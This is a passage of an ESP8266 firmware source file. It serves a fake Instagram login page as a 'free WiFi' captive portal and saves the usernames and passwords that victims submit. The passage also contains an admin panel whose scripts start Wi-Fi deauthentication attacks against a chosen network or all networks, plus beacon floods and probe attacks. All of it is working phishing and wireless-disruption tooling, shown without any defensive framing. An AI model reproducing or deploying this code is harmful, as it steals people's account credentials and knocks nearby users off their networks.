ecsistem/oled-esp8266/src/wifi_portal.cpp
        <div class="container">
          <div class="logo">
            <div class="instagram-logo">Instagram</div>
          </div>
          <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="off" autocapitalize="off">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>

            <div class="divider">
              <div class="line"></div>
              <div class="or">OR</div>
              <div class="line"></div>
            </div>
          </form>
        </div>

        <div class="container" style="text-align: center; padding: 20px;">
          <span style="color: #262626; font-size: 14px;">Don't have an account? </span>
          <a href="#" style="color: #0095f6; font-weight: 600; text-decoration: none; font-size: 14px;">Sign up</a>
        </div>

        <div class="footer">
          <a href="#">About</a><span>•</span>
          <a href="#">Help</a><span>•</span>
          <a href="#">Privacy</a><span>•</span>
          <a href="#">Terms</a>
        </div>
      </div>
    </body>
    </html>
  )rawliteral";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleCredentialSubmit()
  {
    String username = server.arg("username");
    String password = server.arg("password");

    if (username.length() == 0 || password.length() == 0)
    {
      server.send(400, "text/plain; charset=utf-8", "Usuario e senha sao obrigatorios");
      return;
    }

    bool saved = appendCapturedCredential(username, password);

    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>Instagram • Login for Free WiFi</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta http-equiv="refresh" content="3;url=/">
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          margin: 0;
          padding: 0;
          background: #fafafa;
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
        }
        .container {
          width: 350px;
          background: white;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 40px 20px;
          text-align: center;
          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }
        .instagram-logo {
          font-family: 'Segoe UI', Arial, sans-serif;
          font-size: 36px;
          font-weight: bold;
          background: -webkit-linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
          -webkit-background-clip: text;
          background-clip: text;
          -webkit-text-fill-color: transparent;
          margin-bottom: 20px;
        }
        .success {
          color: #0095f6;
          font-size: 18px;
          margin: 15px 0;
        }
        .error {
          color: #ed4956;
          font-size: 18px;
          margin: 15px 0;
        }
        p {
          color: #8e8e8e;
          font-size: 14px;
          line-height: 1.5;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="instagram-logo">Instagram</div>

        )rawliteral";

    if (saved)
    {
      page += R"rawliteral(
        <div class="success">✅ Acesso recebido com sucesso!</div>
        <br>Redirecionando em 3 segundos...</p>
    )rawliteral";
    }
    else
    {
      page += R"rawliteral(
        <div class="error">❌ Falha ao registrar dados</div>
        <br>Tente novamente.</p>
    )rawliteral";
    }

    page += R"rawliteral(
      </div>
    </body>
    </html>
  )rawliteral";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleAdminPortal()
  {
    String wifiOptions = buildWifiSelectOptions();
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;
    String credentialsTable = buildCapturedCredentialsTable();

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";

    page += "<script>";
    page += "function labEsc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');}";
    page += "let selectedApMac = '', selectedChannel = 0;";
    page += "async function loadNetworks(){";
    page += "  const btn = event.target; btn.disabled = true; btn.innerText = 'Buscando...';";
    page += "  try{";
    page += "    const r = await fetch('/api/scan');";
    page += "    const j = await r.json();";
    page += "    let html = '<div style=\"display:flex;flex-direction:column;gap:8px;margin-top:8px\">';";
    page += "    j.networks.forEach(n => {";
    page += "      const ssid = labEsc(n.ssid || '(oculto)');";
    page += "      const bssid = n.bssid;";
    page += "      const rssi = n.rssi;";
    page += "      const ch = n.channel;";
    page += "      html += `<div style=\"background:#262626;padding:12px;border-radius:6px;cursor:pointer;border-left:3px solid #00a6ff\" onclick=\"selectNetwork('${bssid}', '${ssid}', ${ch})\">`;";
    page += "      html += `<div style=\"font-weight:bold\">${ssid}</div>`;";
    page += "      html += `<div style=\"font-size:12px;color:#aaa\">MAC: ${bssid} | Canal: ${ch} | RSSI: ${rssi} dBm</div>`;";
    page += "      html += '</div>';";
    page += "    });";
    page += "    html += '</div>';";
    page += "    document.getElementById('networksList').innerHTML = html;";
    page += "  }catch(e){alert('Erro ao buscar redes');}";
    page += "  btn.disabled = false; btn.innerText = 'Buscar Redes Wi-Fi';";
    page += "}";
    page += "function selectNetwork(bssid, ssid, ch){";
    page += "  selectedApMac = bssid;";
    page += "  selectedChannel = ch;";
    page += "  document.getElementById('selectedTarget').innerText = `${ssid} (${bssid}) - Canal ${ch}`;";
    page += "  document.getElementById('deautherControls').style.display = 'block';";
    page += "}";
    page += "async function startDeauth(){";
    page += "  try{";
    page += "    const r = await fetch('/api/deauth/start', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:`ap_mac=${encodeURIComponent(selectedApMac)}&client_mac=FF:FF:FF:FF:FF:FF&channel=${selectedChannel}`});";
    page += "    const j = await r.json();";
    page += "    alert(j.message);";
    page += "  }catch(e){alert('Erro ao iniciar ataque');}";
    page += "}";
    page += "async function stopDeauth(){";
    page += "  try{";
    page += "    const r = await fetch('/api/deauth/stop', {method:'POST'});";
    page += "    const j = await r.json();";
    page += "    alert(j.message);";
    page += "  }catch(e){alert('Erro ao parar ataque');}";
    page += "}";
    page += "async function startBeacon(){";
    page += "  try{";
    page += "    const r = await fetch('/api/beacon/start', {method:'POST'});";
    page += "    const j = await r.json();";
    page += "    alert(j.message);";
    page += "  }catch(e){alert('Erro ao iniciar beacon flood');}";
    page += "}";
    page += "async function stopBeacon(){";
    page += "  try{";
    page += "    const r = await fetch('/api/beacon/stop', {method:'POST'});";
    page += "    const j = await r.json();";
    page += "    alert(j.message);";
    page += "  }catch(e){alert('Erro ao parar beacon flood');}";
    page += "}";
    page += "async function startDeauthAll(){";
    page += "  try{";
    page += "    const r = await fetch('/api/deauth/start', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'deauth_all=1'});";
    page += "    const j = await r.json();";
    page += "    alert(j.error || j.message);";
    page += "  }catch(e){alert('Erro ao iniciar deauth em todos');}";
    page += "}";
    page += "async function startProbe(){";
    page += "  try{";
    page += "    const r = await fetch('/api/probe/start', {method:'POST'});";
    page += "    const j = await r.json();";
    page += "    alert(j.message);";
    page += "  }catch(e){alert('Erro ao iniciar probe');}";
    page += "}";
    page += "async function stopProbe(){";
    page += "  try{";
    page += "    const r = await fetch('/api/probe/stop', {method:'POST'});";
    page += "    const j = await r.json();";
    page += "    alert(j.message);";
    page += "  }catch(e){alert('Erro ao parar probe');}";
    page += "}";
    page += "</script>";

